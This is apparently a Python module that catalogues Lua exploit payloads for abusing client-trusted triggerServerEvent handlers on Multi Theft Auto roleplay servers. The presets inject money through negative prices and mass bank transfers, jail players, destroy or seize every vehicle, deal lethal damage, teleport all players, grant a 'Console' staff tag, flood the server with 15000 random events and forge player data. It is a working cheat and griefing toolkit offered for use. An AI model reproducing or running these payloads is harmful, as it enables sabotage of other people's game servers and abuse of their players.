"""
Catálogo de payloads — recetas de acción client-side para triggerServerEvent.
Cada preset define: id, nombre, categoría, descripción (qué hace en el servidor),
args_extra y el cuerpo del trigger que va dentro del bucle de jugadores.
"""

PAYLOADS = {
    "elementdata_random": {
        "name": "ElementData aleatorio",
        "category": "ElementData",
        "desc": "Sobrescribe xpPoints/coins de cada jugador con valores aleatorios.",
        "args": "",
        "body": (
            '            setElementData(player, "xpPoints"..math.random(1, 9999), math.random(1, 9999))\n'
            '            setElementData(player, "coins"..math.random(1, 9999), math.random(1, 9999))'
        ),
    },
    "samu_changelife": {
        "name": "Pedro.changeLifeSamu",
        "category": "Vida",
        "desc": "Fuerza cambio de vida (-100) sobre cada jugador vía servidor.",
        "args": "player, player, -100",
        "body": '            triggerServerEvent("Pedro.changeLifeSamu", player, player, -100)',
    },
    "rzk_destroyveh": {
        "name": "rzk:destroyVehicle",
        "category": "Vehículos",
        "desc": "Destruye todos los vehículos por cada jugador (bucle anidado).",
        "args": "root, player, auto",
        "body": (
            '            for _, auto in ipairs(getElementsByType("vehicle")) do\n'
            '                triggerServerEvent("rzk:destroyVehicle", root, player, auto)\n'
            '            end'
        ),
    },
    "prisao_staff": {
        "name": "PrisaoStaff:FazerPrisao",
        "category": "Prisiones",
        "desc": "Aplica prisión al jugador con pena larga (100000).",
        "args": 'root, getElementData(player, "ID"), "La creta", 100000',
        "body": (
            '            local ids = getElementData(player, "ID")\n'
            '            triggerServerEvent("PrisaoStaff:FazerPrisao", root, ids, "La creta", 100000)'
        ),
    },
    "punish_prison_finish": {
        "name": "Punish >> Prison >> Finish",
        "category": "Prisiones",
        "desc": "Finaliza la prisión de cada jugador.",
        "args": "player",
        "body": '            triggerServerEvent("Punish >> Prison >> Finish prison", player)',
    },
    "bike_rent_money": {
        "name": "bike:rent (dinero)",
        "category": "Dinero",
        "desc": "Alquila bici con coste negativo — inyecta dinero (bypass).",
        "args": "localPlayer, localPlayer, -99999999, 1",
        "body": '            triggerServerEvent("bike:rent", localPlayer, localPlayer, -99999999, 1)',
    },
    "math_random_spam": {
        "name": "math.random spam (ID aleatorio)",
        "category": "Spam",
        "desc": "Dispara 15000 triggers con ID aleatorio al root — flood de eventos.",
        "args": "math.random(100000,999999), root",
        "body": '            triggerServerEvent(math.random(100000,999999), root)',
    },
    "teaser_letal": {
        "name": "teaser_letal",
        "category": "Daño",
        "desc": "Aplica teaser letal al jugador (auto-daño).",
        "args": "player, player",
        "body": '            triggerServerEvent("teaser_letal", player, player)',
    },
    "n3xt_buyveh": {
        "name": "N3xT.onBuyVehConce",
        "category": "Vehículos",
        "desc": "Compra vehículo en concesionario con precio negativo.",
        "args": 'player, { "Nombre de un vehiculo", 501, 5, -10000000000 }',
        "body": (
            '            local dados = {"Nombre de un vehiculo", 501, 5, -10000000000}\n'
            '            triggerServerEvent("N3xT.onBuyVehConce", player, dados)'
        ),
    },
    "glue_player": {
        "name": "gluePlayer / ungluePlayer",
        "category": "Agarre",
        "desc": "Pega y despega al jugador de su vehículo (glue).",
        "args": "player, slot, vehicle, 0, 0, 0, 0, 0, -10",
        "body": (
            '            local vehicle = getPedOccupiedVehicle(player)\n'
            '            local slot = getPlayerWeaponSlot(player)\n'
            '            triggerServerEvent("gluePlayer", player, slot, vehicle, 0, 0, 0, 0, 0, -10)\n'
            '            triggerServerEvent("ungluePlayer", player)'
        ),
    },
    "n3xt_apreender": {
        "name": "N3xT.onApreender",
        "category": "Apreensión",
        "desc": "Apreende vehículos por cada jugador — tabla con slots.",
        "args": 'player, vehicle, { [10] = 20, [9] = 20, [5] = 202 }',
        "body": (
            '            for _, vehicle in ipairs(getElementsByType("vehicle")) do\n'
            '                triggerServerEvent("N3xT.onApreender", player, vehicle, { [10] = 20, [9] = 20, [5] = 202 })\n'
            '            end'
        ),
    },
    "byskin": {
        "name": "bySkin (skin)",
        "category": "Skin",
        "desc": "Aplica skin fuera de rango al jugador — corrompe skin.",
        "args": "localPlayer, -5000000, 1",
        "body": '            triggerServerEvent("bySkin", localPlayer, -5000000, 1)',
    },
    "exibir_notificacao": {
        "name": "exibirNotificacao",
        "category": "Notificaciones",
        "desc": "Muestra notificación global con texto arbitrario.",
        "args": 'root, "desativado", 1, "TEXTO AQUI"',
        "body": '            triggerServerEvent("exibirNotificacao", root, "desativado", 1, "TEXTO AQUI")',
    },
    "n3xt_vehgaragem": {
        "name": "N3xT.onVehGaragem",
        "category": "Garaje",
        "desc": "Inyecta vehículo en garaje del jugador con datos falsos.",
        "args": 'player, { "PASOLA", 1, 1000, "Guardado", false, 592, "[ [ 0, 0, 0 ] ]", false, "10/12/2024", ".....", false }',
        "body": (
            '            triggerServerEvent("N3xT.onVehGaragem", player, { "PASOLA", 1, 1000, "Guardado", false, 592, '
            '"[ [ 0, 0, 0 ] ]", false, "10/12/2024", ".....", false })'
        ),
    },
    "caio_enviar": {
        "name": "Caio.onEnviar (banco)",
        "category": "Dinero",
        "desc": "Envía transferencia bancaria masiva (99999999999) al jugador.",
        "args": 'player, getElementData(player, "ID"), "99999999999"',
        "body": (
            '            local ids = getElementData(player, "ID")\n'
            '            triggerServerEvent("Caio.onEnviar", player, ids, "99999999999")'
        ),
    },
    "manager_tag": {
        "name": "onPlayerManagerTag",
        "category": "Tags",
        "desc": "Añade tag 'Console' al ID indicado (pasa el ID real).",
        "args": 'root, "add", "tuID", "Console"',
        "body": '            triggerServerEvent("onPlayerManagerTag", root, "add", "tuID", "Console")',
    },
    "warp_position": {
        "name": "Warp:SetPlayerPositionInteriorDimension",
        "category": "Warp",
        "desc": "Teletransporta a todos los jugadores a coordenadas arbitrarias.",
        "args": "player, 0, 0, 0, 0",
        "body": '            triggerServerEvent("Warp:SetPlayerPositionInteriorDimension", player, 0, 0, 0, 0)',
    },
    "speaker_create": {
        "name": "onSpeakerCreate (música)",
        "category": "Música",
        "desc": "Crea speaker con link de música — la reproduce para todos.",
        "args": 'player, "AQUI EL LINK DE LA MUSICA"',
        "body": '            triggerServerEvent("onSpeakerCreate", player, "AQUI EL LINK DE LA MUSICA")',
    },
    "headshot_loot": {
        "name": "loot1 (headshot + map)",
        "category": "Loot",
        "desc": "Dispara onServerHeadshot + recarga mapas + inyecta FPS/PLoss falsos.",
        "args": "root, player, player, 31, 9.9000005722046",
        "body": (
            '            triggerServerEvent("onServerHeadshot", root, player, player, 31, 9.9000005722046)\n'
            '            triggerServerEvent("onPlayerMapReady", player)\n'
            '            triggerServerEvent("onPlayerMapLoad", player)\n'
            '            triggerServerEvent("onClientCallsServerFunction", root, "setElementData", player, "FPS", "Dragon")\n'
            '            triggerServerEvent("onClientCallsServerFunction", root, "setElementData", player, "PLoss", "99999999999999999999999999999999999999999999")'
        ),
    },
}

def list_presets():
    return [
        {"id": k, "name": v["name"], "category": v["category"], "desc": v["desc"], "args": v["args"]}
        for k, v in PAYLOADS.items()
    ]

def get_preset(pid: str):
    return PAYLOADS.get(pid)
